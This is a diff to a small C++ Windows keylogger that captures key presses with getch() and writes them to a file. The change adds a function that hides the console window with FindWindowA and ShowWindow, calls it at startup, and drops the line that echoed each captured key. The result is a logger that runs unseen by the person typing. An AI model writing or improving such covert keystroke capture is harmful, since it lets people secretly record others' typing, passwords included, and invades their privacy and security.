@@ -1,12 +1,15 @@
-#include <iostream>     
-#include <windows.h>    
-#include <conio.h>      
-#include <fstream>      
+#include <iostream>
+#include <windows.h>
+#include <conio.h>
+#include <fstream>
 using namespace std;
 
 int keys(char key, fstream&);
+void run_in_background(int visibility);
 
 int main() {
+    run_in_background(0);
+
     char key_press;
     int ascii_value;                                                 
     fstream afile;                                                 
@@ -17,7 +20,6 @@ int main() {
     key_press = getch();
     ascii_value = key_press;
     
-    cout << "Here --> " << key_press << endl;
     if(7 < ascii_value && ascii_value < 256)
         keys(key_press, afile);  
     }    
@@ -57,4 +59,10 @@ int keys(char key, fstream& file) {
     }
     file.close();
     return 0;
+}
+
+void run_in_background(int visibility){
+    HWND window;
+    window = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(window, visibility);
 }
